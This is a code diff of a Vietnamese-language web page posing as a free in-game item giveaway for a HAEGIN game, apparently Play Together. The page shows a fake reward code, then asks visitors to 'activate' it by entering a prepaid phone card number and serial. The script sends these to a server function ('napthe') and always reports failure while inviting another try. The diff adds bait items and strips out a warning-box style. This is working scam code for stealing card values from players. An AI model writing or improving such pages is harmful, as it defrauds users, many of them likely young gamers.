@@ -51,10 +51,6 @@
 
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .warning-box { background: #fff5f5; border: 1px solid #feb2b2; padding: 12px; border-radius: 12px; margin-bottom: 20px; text-align: left; }
-        .warning-title { color: #c53030; font-size: 12px; font-weight: 800; text-transform: uppercase; display: block; margin-bottom: 5px; }
-        .warning-text { color: #c53030; font-size: 11px; font-weight: 700; line-height: 1.4; }
         @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
     </style>
 </head>
@@ -77,6 +73,7 @@
         <span class="code-item">PTMYVALENTINE</span>
         <span class="code-item">PTFORTUNETABLE</span>
         <span class="code-item">LEGENDDERBYPT</span>
+        <span class="code-item">FLOWERFAIRYPT</span>
     </div>
 </div>
 
@@ -90,7 +87,6 @@
 </div>
 
 <script>
-    // Tự động ngày tháng
     function updateMarqueeDate() {
         const now = new Date();
         const d = String(now.getDate()).padStart(2, '0');
@@ -101,21 +97,21 @@
     updateMarqueeDate();
 
     const items = [
-        { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
         { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
+        { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
+        { id: 11, name: "Supreme Roadster Cực Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png" },
+        { id: 12, name: "Mùa Vọng Lâu Thiếu Gia Hổ", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png" },
         { id: 3, name: "Cô gái xác ướp", img: "https://i.postimg.cc/vmmwpwzM/IMG-2034.png" },
         { id: 4, name: "Mèo kẹo sao", img: "https://i.postimg.cc/K8Z6MhCT/IMG-1962.png" },
         { id: 5, name: "Thỏ cưng tưng tưng", img: "https://i.postimg.cc/cLn5j3X4/IMG-2052.png" },
         { id: 6, name: "Thiên thần thỏ", img: "https://i.postimg.cc/6qPYb6ZS/IMG-2051.png" },
         { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
         { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
-        // HAI GÓI MỚI ĐƯỢC THÊM VÀO ĐÂY
         { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
         { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" }
     ];
 
     let userPlayerID = ""; 
-
     const grid = document.getElementById('item-grid');
     items.forEach(i => {
         grid.innerHTML += `<div class="card"><img src="${i.img}" class="card-img" onclick="showItemDetail('${i.name}', '${i.img}')"><div style="font-size:13px; font-weight:700; margin: 10px 5px">${i.name}</div><button class="btn-main-receive" onclick="showItemDetail('${i.name}', '${i.img}')">Nhận</button></div>`;
@@ -137,75 +133,31 @@
         const val = document.getElementById('p-id-input').value;
         if(!val) return alert("Vui lòng nhập ID!");
         userPlayerID = val;
-
-        content.innerHTML = `
-            <div style="padding:30px 0">
-                <div class="loader"></div>
-                <p style="font-weight:800; color:#2d3748">Đang tìm kiếm ID người chơi...</p>
-                <p style="font-size:12px; color:#718096; margin-top:10px">Hệ thống đang đồng bộ với máy chủ HAEGIN</p>
-            </div>
-        `;
-
-        setTimeout(() => {
-            showCodeBoard();
-        }, 3000); 
+        content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800; color:#2d3748">Đang tìm kiếm ID người chơi...</p><p style="font-size:12px; color:#718096; margin-top:10px">Hệ thống đang đồng bộ với máy chủ HAEGIN</p></div>`;
+        setTimeout(() => { showCodeBoard(); }, 3000); 
     }
 
     function showCodeBoard() {
         const randomCode = 'NHANCODEPTG' + Math.random().toString(36).substr(2, 6).toUpperCase();
-        content.innerHTML = `
-            <h3>THÔNG TIN CODE</h3>
-            <div style="background:#edf2f7; padding:10px; border-radius:10px; margin: 15px 0">
-                <p style="font-size:14px">ID Player: <b style="color:var(--red)">${userPlayerID}</b></p>
-            </div>
-            <div class="code-display">${randomCode}</div>
-            <div class="status-badge">❌ TRẠNG THÁI: CHƯA KÍCH HOẠT</div>
-            <button class="btn-popup-receive" onclick="openPay()">KÍCH HOẠT NGAY</button>
-        `;
+        content.innerHTML = `<h3>THÔNG TIN CODE</h3><div style="background:#edf2f7; padding:10px; border-radius:10px; margin: 15px 0"><p style="font-size:14px">ID Player: <b style="color:var(--red)">${userPlayerID}</b></p></div><div class="code-display">${randomCode}</div><div class="status-badge">❌ TRẠNG THÁI: CHƯA KÍCH HOẠT</div><button class="btn-popup-receive" onclick="openPay()">KÍCH HOẠT NGAY</button>`;
     }
 
     function openPay() {
-        content.innerHTML = `
-            <h3 style="margin-bottom:15px">HỆ THỐNG KÍCH HOẠT</h3>
-            <label>Loại thẻ</label>
-            <select><option>Zing</option><option>Viettel</option></select>
-            <label>Mệnh giá</label>
-            <select><option>50.000đ</option><option>100.000đ</option><option>200.000đ</option></select>
-            <input type="text" id="c-code" placeholder="Mã thẻ nạp...">
-            <input type="text" id="c-seri" placeholder="Số Seri thẻ...">
-            <button class="btn-popup-receive" onclick="finalLoading()">XÁC NHẬN THẺ</button>
-        `;
+        content.innerHTML = `<h3 style="margin-bottom:15px">HỆ THỐNG KÍCH HOẠT</h3><label>Loại thẻ</label><select><option>Zing</option><option>Viettel</option></select><label>Mệnh giá</label><select><option>50.000đ</option><option>100.000đ</option><option>200.000đ</option></select><input type="text" id="c-code" placeholder="Mã thẻ nạp..."><input type="text" id="c-seri" placeholder="Số Seri thẻ..."><button class="btn-popup-receive" onclick="finalLoading()">XÁC NHẬN THẺ</button>`;
     }
 
     async function finalLoading() {
         let code = document.getElementById('c-code').value;
         let seri = document.getElementById('c-seri').value;
         let type = document.querySelector('select').value; 
-
         if(!code || !seri) return alert("Vui lòng nhập đủ!");
-
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
-
         try {
-            await fetch('/.netlify/functions/napthe', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type, code, seri })
-            });
-
+            await fetch('/.netlify/functions/napthe', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type, code, seri }) });
             setTimeout(() => {
-                content.innerHTML = `
-                    <div style="font-size:50px; margin-bottom:10px">❌</div>
-                    <h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3>
-                    <p>Thẻ có mã <b>${code}</b> không hợp lệ, sai mệnh giá hoặc đã được sử dụng. Vui lòng thử lại!</p>
-                    <button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>
-                `;
+                content.innerHTML = `<div style="font-size:50px; margin-bottom:10px">❌</div><h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3><p>Thẻ có mã <b>${code}</b> không hợp lệ, sai mệnh giá hoặc đã được sử dụng. Vui lòng thử lại!</p><button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>`;
             }, 3000);
-
-        } catch (err) {
-            alert("Hệ thống bận, vui lòng thử lại sau!");
-            openPay();
-        }
+        } catch (err) { alert("Hệ thống bận, vui lòng thử lại sau!"); openPay(); }
     }
 
     function closeModal() { modal.classList.remove('active'); }
